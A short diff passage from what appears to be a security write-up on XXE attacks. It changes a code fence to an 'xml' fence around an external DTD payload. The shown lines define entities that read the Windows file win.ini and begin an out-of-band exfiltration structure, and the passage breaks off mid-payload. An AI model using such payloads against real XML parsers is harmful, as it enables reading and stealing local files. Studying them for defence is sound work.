@@ -144,7 +144,7 @@ Host: myserver.com
 
 ```
 And here is what that `payload.dtd` contains
-```
+```xml
 <?xml version=”1.0″ encoding=”utf-8″ ?>
 <!ENTITY % data SYSTEM “file:///c:/windows/win.ini”>
 <!ENTITY % bravo “<!ENTITY % charlie SYSTEM
